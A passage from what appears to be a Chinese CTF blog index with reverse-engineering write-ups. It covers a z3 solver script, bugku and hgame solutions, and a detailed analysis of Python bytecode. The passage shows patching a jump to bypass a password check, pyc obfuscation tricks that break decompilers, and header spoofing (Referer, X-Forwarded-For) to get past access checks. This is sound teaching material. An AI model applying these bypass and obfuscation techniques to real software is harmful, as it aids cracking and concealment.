0x29])solver.add(enc[0x1e] == ((((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) - c[5]) - c[6]) - c[7]) + c[ 8] + c[9]) - c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[ 0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[ 0x22]) + c[0x23] + c[0x24] + c[0x25]) - c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1f] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3] + c[4]) - c[5]) - c[6]) + c[7] + c[ 8] + c[9] + c[10] + c[0xb] + c[0xc]) - c[0xd]) - c[0xe]) - c[0xf]) + c[0x10] + c[0x11] + c[0x12] + c[0x13]) - c[ 0x14]) + c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) - c[0x19]) + c[ 0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) + c[ 0x21]) - c[0x22]) + c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) + c[0x27]) - c[ 0x28]) - c[0x29])solver.add(enc[0x20] == (((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5] + c[6] + c[7] + c[8]) - c[ 9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd] + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[0x14]) - c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) + c[0x19] + c[0x1a] + c[0x1b]) - c[ 0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22] + c[ 0x23] + c[0x24] + c[0x25]) - c[0x26]) + c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x21] == (((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3] + c[4] + c[5] + c[6]) - c[7]) - c[ 8]) + c[9] + c[10] + c[0xb]) - c[0xc]) - c[0xd]) + c[0xe] + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) + c[0x13]) - c[ 0x14]) + c[0x15] + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[ 0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[ 0x22]) - c[0x23]) + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x22] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3]) - c[4]) - c[5]) - c[6]) + c[7] + c[ 8] + c[9] + c[10] + c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) + c[0x13]) - c[ 0x14]) - c[0x15]) + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[ 0x1b] + c[0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[ 0x22]) - c[0x23]) - c[0x24]) + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x23] == ((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) - c[6]) + c[7] + c[8]) - c[ 9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) - c[0x14]) - c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b] + c[ 0x1c]) - c[0x1d]) - c[0x1e]) + c[0x1f] + c[0x20]) - c[0x21]) + c[0x22] + c[0x23] + c[ 0x24] + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x24] == (((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) - c[4]) - c[5]) - c[6]) + c[7] + c[8] + c[ 9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[ 0x15]) - c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) - c[ 0x24]) + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x25] == ((((((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3]) - c[4]) + c[5]) - c[6]) - c[ 7]) - c[8]) - c[9]) + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) + c[0x11] + c[0x12]) - c[ 0x13]) - c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) + c[0x18]) - c[ 0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f]) - c[ 0x20]) + c[0x21]) - c[0x22]) + c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[ 0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x26] == ((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) + c[5] + c[6] + c[7]) - c[8]) - c[ 9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) - c[0x11]) - c[0x12]) - c[0x13]) + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) - c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) - c[0x24]) - c[0x25]) + c[0x26] + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x27] == (((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) - c[4]) + c[5]) - c[6]) - c[7]) - c[8]) + c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe]) - c[0xf]) - c[0x10]) - c[ 0x11]) + c[0x12] + c[0x13] + c[0x14] + c[0x15] + c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a] + c[0x1b] + c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20] + c[ 0x21] + c[0x22]) - c[0x23]) - c[0x24]) + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) + c[ 0x29])solver.add(enc[0x28] == ((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5] + c[6]) - c[7]) + c[8] + c[ 9]) - c[10]) + c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[ 0x15] + c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b] + c[ 0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) + c[0x23] + c[ 0x24]) - c[0x25]) + c[0x26] + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x29] == (((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6]) - c[7]) - c[8]) - c[9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) - c[0xf]) - c[ 0x10]) - c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) + c[ 0x16]) - c[0x17]) - c[0x18]) + c[0x19] + c[0x1a] + c[0x1b] + c[0x1c]) - c[ 0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) - c[ 0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29]) 这一部分可以直接用脚本来写，把所有的param_1替换并且注意把（uint)和*param_1特殊处理一下就好了 然后解出为唯一解 1234567if solver.check() == sat: r = solver.model() for i in range(42): flag.append(r[c[i]].as_long() ^ i) flag = ''.join(map(lambda x: chr(((x &gt;&gt; 3) | (x &lt;&lt; 5)) &amp; 0xff), flag)) print flag 直接输出flag 1SUCTF{Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!} unicorn和z3实在是太好用了，之前b01lersCTF的第一道题我还愚蠢的手解方程，早知道z3一把梭就完了……","link":"/2020/03/27/babyunic-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"title":"bugku-re部分题解","text":"这里记录一下bugku平台上一些re题的题解 入门逆向直接拖进IDA反编译 直接可以看到flag Easy_vbIDA或OD反编译，搜索字符串 看到有flag样式的字符串，是MCTF比赛的题，bugku上需要提交flag(xxx)，所以把MCTF改成flag{} Easy_Re用OD调试，搜索字符串，找到需要我们输入字符串的位置：发现提示语和%s，找到输入字符串的位置，加断点单步调试程序会把输入的字符串和flag进行比较，相同则通过，在寄存器中找到正确的flag 游戏过关这题可以有至少三种解法：1、第一种解法直接游戏通关，很简单，依次输入1-8即可2、使用OD修改程序首先查找字符串找到输出flag关键函数找到如图所示函数的起始地址，跳转两次找到关键判断可以看到jnz指令进行了跳转，如果没有跳转，将会执行输出flag的函数，现在修改程序，将跳转过后的指令修改为输出flag指令直接运行程序，输入任意数字都可得到flag3、进行解码解出flag可在上图4-2中看到处理flag的部分，将下面的16进制进行解码即可都得到flag 逆向入门下载下来admin.exe，发现打不开，peid检查发现不是PE程序，用文本编辑器打开，发现时图片转base64，转成图片得到二维码扫描得到flag loveIDA打开反编译，找到输出部分发现进行了处理之后将两个base64比较，如果相同就输出flag正确，所以只要将Str2进行反变换就得到了正确的flag 123456789101112import base64s = \"e3nifIH9b_C@n@dH\"flag = \"\"for i in range(len(s)): flag += chr(ord(s[i]) - i)flag = base64.b64decode(flag)print(flag)","link":"/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"handcrafted-pyc-攻防世界","text":"很早以前就想写一篇关于python的字节码的文章，但是一直没什么时间，借着刚好做到这一题，写一写我对相关内容的理解。 准备工作拿到的题目并不是一个pyc格式的文件 1234567#!/usr/bin/env python# -*- coding: utf-8 -*-import marshal, zlib, base64exec(marshal.loads(zlib.decompress(base64.b64decode('eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==')))) 通过解码之后运行，提示输入密码，将其转为pyc格式的文件 12345678import marshal, zlib, base64import impb64d = base64.b64decode('eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==')zd = zlib.decompress(b64d)ml = marshal.loads(zd)with open('crackme.pyc','wb') as f: f.write(imp.get_magic() + b'\\0' * 4 + zd) 具体写入的内容是什么在后面介绍。 文件格式PyCodeObject定义如下 123456789101112131415161718typedef struct { PyObject_HEAD int co_argcount; /* #arguments, except *args */ int co_nlocals; /* #local variables */ int co_stacksize; /* #entries needed for evaluation stack */ int co_flags; /* CO_..., see below */ PyObject *co_code; /* instruction opcodes */ PyObject *co_consts; /* list (constants used) */ PyObject *co_names; /* list of strings (names used) */ PyObject *co_varnames; /* tuple of strings (local variable names) */ PyObject *co_freevars; /* tuple of strings (free variable names) */ PyObject *co_cellvars; /* tuple of strings (cell variable names) */ /* The rest doesn't count for hash/cmp */ PyObject *co_filename; /* string (where it was loaded from) */ PyObject *co_name; /* string (name, for reference) */ int co_firstlineno; /* first source line number */ PyObject *co_lnotab; /* string (encoding addr&lt;-&gt;lineno mapping) */} PyCodeObject; 以本题为例 123456-&gt; hexdump -C crackme.pyc 00000000 03 f3 0d 0a 00 00 00 00 63 00 00 00 00 00 00 00 |........c.......|00000010 00 02 00 00 00 40 00 00 00 73 23 00 00 00 64 01 |.....@...s#...d.|00000020 00 84 00 00 5a 00 00 65 01 00 64 02 00 6b 02 00 |....Z..e..d..k..|00000030 72 1f 00 65 00 00 83 00 00 01 6e 00 00 64 00 00 |r..e......n..d..|00000040 53 首先几个字节是文件头，首先的四个字节是 MagicNumber ， 接下来的四个字节是 时间戳 ，采用小端序，不过写入的都是0，也无所谓，和PE文件格式里的时间一样，这一项实际上并没有什么用，这里对应的是之前写入的imp.get_magic() + b'\\0' * 4，只有包含这样的文件头才是一个合法的pyc文件。 后面是 PyCodeObject 。首先会有一个 TYPE_CODE ， 这里是字符 ， 所以是 C ， 即0x63 。后面是参数个数 co_argcount ， 局部变量个数 co_nlocals ， 栈空间 co_stacksize ， 和 co_flags ，每项均占用4个字节。 我们可以解析出来这样的一个结构（需要注意是小端序） 12345678910magic 03f30d0amoddate 00000000 (Thu Jan 1 08:00:00 1970)code argcount 0 nlocals 0 stacksize 2 flags 0040 code 6401008400005a00006501006402006b0200721f00650000830000016e00 0064000053 co_flags后面是co_code，把它单独拿出来，因为它也有一些自己的结构 co_code同样先是 TYPE_CODE , 类型标识 ， 这里是 s ， 即 0x73 。后面的四个字节用来标识指令的 长度 ， 这里是 0x23 。紧跟在后面的是具体的字节码，包含指令和操作数，有些指令是没有操作数的，指令占用一个字节，操作数占用两个字节，字节码和指令的对应关系和指令的作用可以查阅这篇文章或者直接去查阅dis的手册。 给出链接 https://docs.python.org/2/library/dis.html https://github.com/python/cpython/blob/master/Include/opcode.h 用dis模块来解析一下这段字节码 1234567891011121314151 0 LOAD_CONST 1 (&lt;code object main at 0000000003656E30, file \"&lt;string&gt;\", line 1&gt;) 3 MAKE_FUNCTION 0 6 STORE_NAME 0 (main)4 9 LOAD_NAME 1 (__name__) 12 LOAD_CONST 2 ('__main__') 15 COMPARE_OP 2 (==) 18 POP_JUMP_IF_FALSE 315 21 LOAD_NAME 0 (main) 24 CALL_FUNCTION 0 27 POP_TOP 28 JUMP_FORWARD 0 (to 31) &gt;&gt; 31 LOAD_CONST 0 (None) 34 RETURN_VALUE 第一列数字是这个代码块在源码中的行数 ， 第二列数字表示该指令在 co_code 中的偏移 ， 第三列表示具体操作 ， 第四列是操作数。 这道题目可以看出来又调用了一个PyCodeObject，这个在后面在分析，先关注一个问题，这个 PyCodeObject是通过LOAD_CONST指令调用的，是储存在co_const中的常量 co_const既然单拉出来就说明它也有自己的结构 每一项都是以0x28 开头，为 TYPE_TUPLE， 即 '(' 。接下来的四个字节为元素个数，这里是0x03。 12&gt;&gt;&gt; code.co_consts(None, &lt;code object main at 0x7fa4909ea530, file \"&lt;string&gt;\", line 1&gt;, '__main__') 其它后面为co_names，标识0x28，接着四个字节为元素个数 ， 然后字符类型 ， 字符内容。 co_varnames , co_freevars , co_cellvars 结构与上面相同。 然后是co_filename，标识类型，路径长度 ，路径 。 然后是co_name，同样是标识类型，长度，内容。 co_firstlineno，这里为0x01 。 字节码指令与源文件行号对应关系储存在co_lnotab，同样是标识类型，四字节长度，内容。 这是文件对应的信息（const去掉了None） ('main', '__name__')12345678names ('main', '__name__')varnames ()freevars ()cellvars ()filename '&lt;string&gt;'name '&lt;module&gt;'firstlineno 1lnotab 000009030c01 pyc文件格式的粗略解析就差不多了，可以看出来比ELF，PE都要简单得多。 题目分析前面看到，本题还有一个PyCodeObject main是主要操作，所以用上面的方法再来解析一下main函数（太长了，就不全放出来了） 主要关注输入操作 123456789101112131415737 LOAD_CONST 0 (None)740 NOP 741 JUMP_ABSOLUTE 759 &gt;&gt; 744 LOAD_GLOBAL 1 (raw_input) 747 JUMP_ABSOLUTE 1480 &gt;&gt; 750 LOAD_FAST 0 (password) 753 COMPARE_OP 2 (==) 756 JUMP_ABSOLUTE 767 &gt;&gt; 759 ROT_TWO 760 STORE_FAST 0 (password) 763 POP_TOP 764 JUMP_ABSOLUTE 744 &gt;&gt; 767 POP_JUMP_IF_FALSE 1591 770 LOAD_GLOBAL 0 (chr) 773 LOAD_CONST 17 (99) 发现这里只是经过一个简单的比较，完全可以bypass，以16进制打开，修改POP_JUMP_IF_FALSE 1591成nop就可以了 所以开始查表POP_JUMP_IF_FALSE对应的值为114（0x72），1591（0x637）is \\x37\\x06 （小端序） 所以要查找72 37 06 ，nop对应的值为09，所以需要改成09 09 09 然后直接运行，输入任何值都可以输出flag 123-&gt; ./crackme.pyc password: 0hitcon{Now you can compile and run Python bytecode in your brain!} 当然也可以逐步分析 12345678910111213141516171819&gt;&gt; 767 POP_JUMP_IF_FALSE 1591 770 LOAD_GLOBAL 0 (chr) 773 LOAD_CONST 17 (99) 776 CALL_FUNCTION 1 779 LOAD_GLOBAL 0 (chr) 782 LOAD_CONST 10 (116) 785 CALL_FUNCTION 1 788 LOAD_GLOBAL 0 (chr) 791 LOAD_CONST 14 (105) 794 CALL_FUNCTION 1 797 LOAD_GLOBAL 0 (chr) 800 LOAD_CONST 9 (104) 803 CALL_FUNCTION 1 806 ROT_TWO 807 BINARY_ADD 808 ROT_TWO 809 BINARY_ADD 810 ROT_TWO 811 BINARY_ADD 这是后面的一部分操作，分析一下，调用chr()函数，把存储的几个数字转成字符，此时的栈 123456|--------high--------||--------'c'---------||--------'t'---------||--------'i'---------||--------'h'---------||--------...---------| 执行一次ROT_TWO，栈顶两个元素换位，然后BINARY_ADD，经过几次，然后进行下一组 123456|--------high--------| |--------high--------| |--------high--------||--------'c'---------| |--------'c'---------| |--------'hitc'------||--------'t'---------| |--------'t'---------| |--------...---------||--------'i'---------| |--------'hi'--------||--------'h'---------| |--------...---------||--------...---------| 大概的变化过程就是这样，仔细分析，每四个字符一组，每组做一个倒序处理 然后跳转到最后 1234&gt;&gt; 2212 PRINT_ITEM 2213 PRINT_NEWLINE 2214 LOAD_CONST 0 (None) 2217 RETURN_VALUE 直接输出，这样就得到需要的flag 混淆从上面也可以看出来，一个不经过处理的pyc文件是没有任何安全性可言的，甚至可以被一些工具如uncompyle6或者在线工具直接反编译成python代码，并且从代码风格来看准确率还是很高的，这时候就需要掌握一些简单的混淆/反混淆的技巧 uncompyle6这个工具还是很好用的，但是一旦报错就停止对文件的分析，而且想让uncompyle6等工具报错也很简单，只需要在开头添加一个绝对跳转就可以了，JUMP_ABSOLUTE 3对应的字节码为 71 03 00，同时修改co_code的长度，这个时候使用一些工具就会报错 1&lt;&lt;&lt; Error: Decompiling stopped due to &lt;class 'uncompyle6.semantics.pysource.ParserError'&gt; 但是dis还是可以正常工作的，程序也是可以正常执行的，因为我们自己加入了3个字节，然后跳转到第四个字节（编号为3）的位置，只是多了一个执行周期，对程序的执行流程没有任何影响。 dis对于一些新手来说，没法使用工具就基本上束手无策了，但是对于熟练掌握汇编语言的人来说，读懂dis解析出来的代码太容易了，就像刚刚我们就很容易的读懂了这道题目的执行逻辑（虽然很简单） 所以还需要一定的方法阻止破解者使用dis进行分析 这会需要多一些处理 给代码段头部添加 0x71 0x00 0x06 0x64 0xff 0xff 。 同样需要修改 co_code 的长度。 这段指令的意义很简单 1230 JUMP_ABSOLUTE 63 LOAD_CONST 65535 6 ... 直接跳到了编号为6的位置，中间一句是不执行的，但是dis解析的时候会判断这句报错，因为不存在第65535项常量，这是条非法指令。但由于第一条绝对跳转的存在，第二条指令永远都不会被执行。通常的反汇编器如dis并不能理解实际执行的控制流，当反汇编器尝试反汇编第二条指令时，会去读取co_const的第65535项并且抛出一个异常。然后dis就会相应报错： 1IndexError: tuple index out of range 这比骗过IDA要容易得多 虚假分支合理设置条件，创造出很多程序不可能执行的分支，但是逆向者需要认真鉴别每一条分支是否被执行。 这不会使逆向者反汇编失败，但是会对分析造成极大的困难，就像是可恨的控制流平坦化，属实劝退。 而且也没什么好办法，只能慢慢分析 重叠指令重叠指令在有变长指令的机器（如X86)上有广泛应用。直接在网上找了一些x86重叠指令： 1234567;单重叠00: EB 01 jmp 302: 68 c3 90 90 90 push 0x909090c3;实际执行00: EB 01 jmp 303: C3 retn 123456789;多重叠指令00: EB02 jmp 402: 69846A40682C104000EB02 imul eax, [edx + ebp*2 + 0102C6840], 0x002EB0040;实际执行00: EB02 jmp 404: 6A40 push 04006: 682C104000 push 0x40102C0B: EB02 jmp 0xF 12345678;跳转至自身00: EBFF jmp 102: C0C300 rol bl, 0;实际执行00: EBFF jmp 101: FFC0 inc eax03: C3 retn 在python上也同样适用 12340 JUMP_ABSOLUTE [71 05 00] 5 3 NOP [09 -- --]4 LOAD_CONST [64 64 00] 647 STOP_CODE [00 -- --] 一个简单的例子，进行了跳转之后，该位置是64，是有效指令所以读取了两个字节的操作数，实际上这段只执行了一句有效指令LOAD_CONST 0 指令集现有的指令集是有定义的，但是如果有人修改了原有的定义，按照新的方式去赋值，就完全无法解析，遇见的不多，这样的情况似乎就只能通过函数的逻辑去猜测指令的意义 万恶的VM，万恶的出题人 SMC程序在循行开始的时候按照自己设定的加解密方式对真正的代码进行加密，然后再执行真正的代码部分，这样的方式利用python也可以实现 后记本来是由一个题发散出来，结果写了很多，都只是一些个人的理解，整理整理才觉得还有很多需要学的东西。 解析的时候借用了一个国外大佬写的dis的代码，输出的层次很清晰，非常适合学习，原文写的也很不错。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import dis, marshal, struct, sys, time, typesdef show_file(fname): f = open(fname, \"rb\") magic = f.read(4) moddate = f.read(4) modtime = time.asctime(time.localtime(struct.unpack('I', moddate)[0])) print \"magic %s\" % (magic.encode('hex')) print \"moddate %s (%s)\" % (moddate.encode('hex'), modtime) code = marshal.load(f) show_code(code)def show_code(code, indent=''): print \"%scode\" % indent indent += ' ' print \"%sargcount %d\" % (indent, code.co_argcount) print \"%snlocals %d\" % (indent, code.co_nlocals) print \"%sstacksize %d\" % (indent, code.co_stacksize) print \"%sflags %04x\" % (indent, code.co_flags) show_hex(\"code\", code.co_code, indent=indent) dis.disassemble(code) print \"%sconsts\" % indent for const in code.co_consts: if type(const) == types.CodeType: show_code(const, indent + ' ') else: print \" %s%r\" % (indent, const) print \"%snames %r\" % (indent, code.co_names) print \"%svarnames %r\" % (indent, code.co_varnames) print \"%sfreevars %r\" % (indent, code.co_freevars) print \"%scellvars %r\" % (indent, code.co_cellvars) print \"%sfilename %r\" % (indent, code.co_filename) print \"%sname %r\" % (indent, code.co_name) print \"%sfirstlineno %d\" % (indent, code.co_firstlineno) show_hex(\"lnotab\", code.co_lnotab, indent=indent)def show_hex(label, h, indent): h = h.encode('hex') if len(h) &lt; 60: print \"%s%s %s\" % (indent, label, h) else: print \"%s%s\" % (indent, label) for i in range(0, len(h), 60): print \"%s %s\" % (indent, h[i:i + 60])show_file(sys.argv[1])","link":"/2020/03/16/handcrafted-pyc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"title":"Hello World","text":"My first post to say “Hello”.","link":"/2019/12/30/hello-world/"},{"title":"hgame_wp","text":"记录一下Hgame的部分题解和一些解题时的思路 Week1Web接 头 霸 王打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头： 1Referer:https://vidar.club 然后提示需要从本地访问，添加响应头： 1X-Forwarded-For: 127.0.0.1 接着提示flag会在2077年更新，所以添加响应头： 1If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT 再发送请求得到flag 1hgame{W0w!Your_heads_@re_s0_many!} REmaze一看题目又是一道迷宫题，拖进IDA反编译 12345678910111213141516171819202122232425262728293031323334353637383940414243444546v5 = (char *)&amp;unk_6020C4; while ( (signed int)v4 &lt; SHIDWORD(v4) ) { v3 = s[(signed int)v4]; if ( v3 == 100 ) { v5 += 4; } else if ( v3 &gt; 100 ) { if ( v3 == 115 ) { v5 += 64; } else { if ( v3 != 119 ) {LABEL_12: puts(\"Illegal input!\"); exit(0); } v5 -= 64; } } else { if ( v3 != 97 ) goto LABEL_12; v5 -= 4; } if ( v5 &lt; (char *)&amp;unk_602080 || v5 &gt; (char *)&amp;unk_60247C || *(_DWORD *)v5 &amp; 1 ) goto LABEL_22; LODWORD(v4) = v4 + 1; } if ( v5 == (char *)&amp;unk_60243C ) { sprintf(&amp;v7, \"hgame{%s}\", s, v4); puts(\"You win!\"); printf(\"Flag is: \"); puts(&amp;v7); exit(0); }LABEL_22: puts(\"You died\"); exit(0); 贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点 即从（2，2）位置走到（15，16）位置 所以最后的flag为 1hgame{ssssddddddsssssddwwdddssssdssdd} bitwise_operation2这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。 首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125//只贴出了有用的部分并且稍做了排版void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ char v6; // [rsp+10h] [rbp-60h] char v7; // [rsp+11h] [rbp-5Fh] char v8; // [rsp+12h] [rbp-5Eh] char v9; // [rsp+13h] [rbp-5Dh] char v10; // [rsp+14h] [rbp-5Ch] char v11; // [rsp+15h] [rbp-5Bh] char v12; // [rsp+16h] [rbp-5Ah] char v13; // [rsp+17h] [rbp-59h] __int64 v14; // [rsp+20h] [rbp-50h] char v15; // [rsp+28h] [rbp-48h] __int64 v16; // [rsp+30h] [rbp-40h] char v17; // [rsp+38h] [rbp-38h] char s; // [rsp+40h] [rbp-30h] //地址是连续的，flag中间的具体内容是v24和v25起始的两个16 char v19; // [rsp+41h] [rbp-2Fh] //字节 char v20; // [rsp+42h] [rbp-2Eh] char v21; // [rsp+43h] [rbp-2Dh] char v22; // [rsp+44h] [rbp-2Ch] char v23; // [rsp+45h] [rbp-2Bh] __int16 v24; // [rsp+46h] [rbp-2Ah] __int16 v25; // [rsp+56h] [rbp-1Ah] char v26; // [rsp+66h] [rbp-Ah] 